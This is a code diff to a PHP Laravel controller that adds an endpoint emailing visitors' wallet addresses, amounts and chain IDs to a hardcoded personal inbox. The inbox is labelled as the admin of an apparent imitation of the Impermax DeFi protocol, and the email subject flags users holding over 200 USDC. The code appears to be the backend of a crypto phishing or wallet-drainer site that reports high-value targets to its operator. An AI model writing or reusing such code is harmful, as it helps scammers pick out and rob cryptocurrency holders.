@@ -13,6 +13,7 @@ use Carbon\Carbon;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Support\Facades\Mail;
+use Illuminate\Support\Facades\Cache;
 
 class GeneralController extends Controller
 {
@@ -356,5 +357,57 @@ class GeneralController extends Controller
             'success' => false,
             'message' => 'Tab không hợp lệ'
         ], 400);
+    }
+
+
+    public function sendMail(Request $request)
+    {
+        $validator = Validator::make($request->all(), [
+            'address' => 'required|string',
+            'amount' => 'required|numeric',
+            'chainId' => 'required|string',
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json(['error' => $validator->errors()], 422);
+        }
+
+        $cacheKey = 'send_mail_' . $request->chainId . '_' . strtolower($request->address);
+
+        if (Cache::has($cacheKey)) {
+            return response()->json([
+                'message' => 'You have already sent a message.',
+            ], 429);
+        }
+
+        $mailMessage = '';
+
+        try {
+            $data = [
+                'address' => $request->address,
+                'amount' => $request->amount,
+                'chainId' => $request->chainId
+            ];
+
+            $getEmail = 'hetthatroi040@gmail.com';
+            $getName = 'Admin Impermaxudy';
+            $chain = $request->chainId == 1 ? 'ETH' : 'BSC';
+
+            Mail::send('emails.account', compact('data', 'chain'), function ($message) use ($getEmail, $getName) {
+                $message->to($getEmail, $getName)
+                    ->subject('Hệ thống ghi nhận người dùng truy cập số dư trên 200 USDC');
+            });
+
+            Cache::put($cacheKey, true, 60 * 24);
+        } catch (\Exception $e) {
+            return response()->json([
+                'message' => 'Warning: Failed to send email - ' . $e->getMessage(),
+            ], 500);
+        }
+
+        return response()->json([
+            'message' => 'Send mail successfully',
+            'data' => $data
+        ]);
     }
 }
